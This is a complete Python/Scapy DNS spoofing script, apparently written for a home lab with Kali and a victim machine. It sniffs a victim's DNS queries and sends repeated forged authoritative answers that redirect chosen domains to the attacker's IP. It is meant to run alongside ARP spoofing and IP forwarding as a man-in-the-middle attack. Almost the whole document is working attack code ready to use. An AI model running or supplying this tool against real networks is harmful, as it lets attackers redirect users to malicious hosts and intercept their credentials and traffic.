#!/usr/bin/env python3

from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp, sniff, get_if_hwaddr
import os
import signal
import sys
import time

# --- Configuration ---
KALI_IP = "192.168.1.7"
VICTIM_IP = "192.168.1.8"
GATEWAY_IP = "192.168.1.1" # For context, used to understand traffic flow

# Domains to spoof and the IP they should resolve to
SPOOFED_DOMAINS = {
    b"example.com.": KALI_IP,
    b"vulnweb.com.": KALI_IP,
    # Add more domains if needed
}

IFACE = "eth0" # Your attacking interface
SEND_COUNT = 35  # Number of spoofed packets to send to try and win the race
# --- End Configuration ---

# Global variable for our Kali machine's MAC address on the chosen interface
KALI_MAC = ""

def get_interface_ip(iface_name):
    """Attempt to get IP for a given interface (not strictly needed for spoofer but good utility)"""
    try:
        # This is a bit Linux specific, alternative might be needed for other OS
        # For Scapy, conf.iface often holds the IP, but let's be explicit
        output = os.popen(f"ip addr show {iface_name}").read()
        for line in output.splitlines():
            if "inet " in line: # Look for IPv4
                return line.strip().split()[1].split('/')[0]
    except Exception as e:
        print(f"[!] Error getting IP for interface {iface_name}: {e}")
    return None


def get_default_interface_name():
    """Attempt to get the default interface if not specified"""
    try:
        route_info = [line for line in os.popen("ip route show").read().splitlines() if "default" in line]
        if route_info:
            return route_info[0].split()[4]
    except Exception as e:
        print(f"[!] Error getting default interface name: {e}")
    return None

def signal_handler(sig, frame):
    print("\n[*] DNS Spoofer stopped.")
    print("[*] Remember to stop ARP spoofing if it's running in other terminals!")
    print("[*] Also, consider disabling IP forwarding if you manually enabled it: sudo sysctl -w net.ipv4.ip_forward=0")
    sys.exit(0)

def dns_responder(packet):
    global KALI_MAC # Use the global Kali MAC

    # The BPF filter in sniff() already ensures:
    # - packet has IP layer
    # - packet[IP].src == VICTIM_IP
    # - packet has UDP layer
    # - packet[UDP].dport == 53

    # We further check for DNS Query Record and that it's a query
    if packet.haslayer(DNS) and packet[DNS].qr == 0 and packet.haslayer(DNSQR):
        qname_bytes = packet[DNSQR].qname

        if qname_bytes in SPOOFED_DOMAINS:
            target_ip_for_domain = SPOOFED_DOMAINS[qname_bytes]
            qname_str = qname_bytes.decode(errors='ignore').rstrip('.')

            # Ensure we're acting on the packet received by our MAC (due to ARP spoof),
            # not a packet Kali might be forwarding.
            if packet.haslayer(Ether) and packet[Ether].dst.lower() == KALI_MAC.lower():
                print(f"[*] Intercepted DNS query for '{qname_str}' from {packet[IP].src} (MAC dst: {packet[Ether].dst})")
                print(f"    Transaction ID: {packet[DNS].id}")
                print(f"    Original Dest IP (True DNS Server): {packet[IP].dst}") # This is likely the gateway
                print(f"    Victim's MAC (packet eth src): {packet[Ether].src}")

                # --- Craft the spoofed DNS response (Layer 2) ---

                # Ethernet Layer for the response:
                # Src: Our Kali MAC
                # Dst: Victim's MAC (which is packet[Ether].src from the incoming query)
                eth_layer_response = Ether(src=KALI_MAC, dst=packet[Ether].src)

                # IP Layer for the response:
                # Src: The IP of the DNS server the victim originally queried (packet[IP].dst)
                # Dst: Victim's IP (packet[IP].src)
                ip_layer_response = IP(
                    dst=packet[IP].src,
                    src=packet[IP].dst,
                    ihl=packet[IP].ihl if packet[IP].ihl else None # Copy IHL if present
                )

                # UDP Layer for the response:
                # Src Port: 53 (DNS)
                # Dst Port: Victim's original source port (packet[UDP].sport)
                udp_layer_response = UDP(dport=packet[UDP].sport, sport=53)

                # DNS Answer Record
                dns_answer_rr = DNSRR(
                    rrname=qname_bytes,
                    ttl=60,         # Time To Live for the spoofed record
                    type="A",       # 'A' record for IPv4 address
                    rclass="IN",    # Internet class
                    rdata=target_ip_for_domain # The IP we want the victim to resolve to
                )

                # DNS Layer for the response:
                dns_layer_response = DNS(
                    id=packet[DNS].id,      # Must match the query's transaction ID
                    qr=1,                   # 1 indicates a response
                    aa=1,                   # Authoritative Answer flag (makes it look more legit)
                    rd=packet[DNS].rd,      # Recursion Desired (usually copied from query)
                    ra=1,                   # Recursion Available (set to 1, as if we can do it)
                    qdcount=packet[DNS].qdcount, # Should be 1
                    ancount=1,              # We are providing 1 answer
                    nscount=0,              # Number of Name Server resource records
                    arcount=0,              # Number of Additional Resource records
                    qd=packet[DNSQR],       # The original question
                    an=dns_answer_rr        # Our spoofed answer
                )

                # Construct the full spoofed packet (L2 to L4/DNS)
                spoofed_packet_l2 = eth_layer_response / ip_layer_response / udp_layer_response / dns_layer_response

                try:
                    for i in range(SEND_COUNT):
                        sendp(spoofed_packet_l2, iface=IFACE, verbose=0)
                    print(f"[+] Sent {SEND_COUNT} L2 spoofed DNS response(s): {qname_str} -> {target_ip_for_domain} to {packet[IP].src} (MAC: {packet[Ether].src})\n")
                except Exception as e:
                    print(f"[!] Error sending spoofed packet with sendp: {e}")

            # else:
            #     # This part helps debug if packets are seen but not acted upon due to MAC mismatch
            #     if packet.haslayer(Ether):
            #         print(f"[-] Ignoring packet for '{qname_str}'. Dst MAC: {packet[Ether].dst} != Kali MAC: {KALI_MAC}")
            #     else:
            #         print(f"[-] Ignoring packet for '{qname_str}'. No Ethernet layer found to check MAC.")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root.")
        sys.exit(1)

    # Determine interface and KALI_MAC
    if not os.path.exists(f'/sys/class/net/{IFACE}'):
        print(f"[*] Configured interface '{IFACE}' not found.")
        detected_iface = get_default_interface_name()
        if detected_iface:
            IFACE = detected_iface
            print(f"[*] Using detected interface: '{IFACE}'")
        else:
            print(f"[!] Could not auto-detect a default network interface. Please set IFACE manually in the script.")
            if os.path.exists('/sys/class/net/'):
                 print(f"    Available interfaces: {', '.join(os.listdir('/sys/class/net/'))}")
            sys.exit(1)

    try:
        KALI_MAC = get_if_hwaddr(IFACE)
        print(f"[*] Attacker MAC for {IFACE}: {KALI_MAC}")
    except Exception as e: # Scapy might raise an error if interface is down or invalid
        print(f"[!] Could not get MAC address for interface '{IFACE}' using Scapy: {e}")
        print(f"    Ensure interface '{IFACE}' is up and valid.")
        # Fallback to reading from /sys/class/net if Scapy fails, though Scapy's way is preferred
        try:
            with open(f'/sys/class/net/{IFACE}/address', 'r') as f:
                KALI_MAC = f.read().strip()
            print(f"[*] Attacker MAC for {IFACE} (from /sys): {KALI_MAC}")
        except FileNotFoundError:
            print(f"[!] Could not get MAC address for interface '{IFACE}' from /sys either. Exiting.")
            sys.exit(1)

    if not KALI_MAC: # Should be caught by exceptions, but as a safeguard
        print(f"[!] Failed to obtain MAC address for {IFACE}. Exiting.")
        sys.exit(1)

    # Check and report IP forwarding status
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            ip_forward_status = f.read().strip()
            if ip_forward_status == '1':
                print("[+] IP forwarding is enabled on attacker machine.")
            else:
                print(f"[!] IP forwarding is NOT enabled (value: {ip_forward_status}) on attacker machine.")
                print("    For successful MITM, enable it with: sudo sysctl -w net.ipv4.ip_forward=1")
                # Consider exiting if not enabled, or prompt to enable
    except FileNotFoundError:
        print("[!] Could not check IP forwarding status (/proc/sys/net/ipv4/ip_forward not found). Please ensure it's enabled for MITM.")

    # Setup signal handler for graceful exit
    signal.signal(signal.SIGINT, signal_handler)

    print(f"[*] Starting DNS Spoofer on interface '{IFACE}' (MAC: {KALI_MAC})")
    print(f"[*] Target Victim IP: {VICTIM_IP}")
    print(f"[*] Spoofing DNS responses to point to: {KALI_IP}")
    print(f"[*] Domains to spoof:")
    for domain, ip_addr in SPOOFED_DOMAINS.items():
        print(f"    - {domain.decode(errors='ignore').rstrip('.')} -> {ip_addr}")
    print("[*] Waiting for DNS queries from victim...")
    print("--- ENSURE ARP SPOOFING IS ACTIVE against the victim for their DNS server/gateway! ---")
    print("--- ENSURE IP FORWARDING IS ENABLED on this machine for traffic to pass through! ---")


    # BPF filter: Capture UDP packets from VICTIM_IP on destination port 53 (DNS)
    # This is efficient as filtering happens in the kernel.
    bpf_filter = f"ip src host {VICTIM_IP} and udp dst port 53"
    # An alternative, slightly broader filter if the above is too restrictive or if MACs are tricky in some setups:
    # bpf_filter = f"ip src host {VICTIM_IP} and udp dst port 53"
    # The MAC check is then done in the dns_responder callback.
    # The first filter is more targeted if KALI_MAC is reliably the eth.dst.

    print(f"    Using Scapy BPF filter: \"{bpf_filter}\"")

    try:
        sniff(filter=bpf_filter, prn=dns_responder, iface=IFACE, store=0)
    except OSError as e: # Handle common errors like "No such device"
        if "No such device" in str(e) or "Socket type not supported" in str(e):
             print(f"[!] Error starting sniffer on interface '{IFACE}': {e}")
             if os.path.exists('/sys/class/net/'):
                 print(f"    Available interfaces: {', '.join(os.listdir('/sys/class/net/'))}")
        else:
            print(f"[!] OS Error starting sniffer: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An unexpected error occurred with the sniffer: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
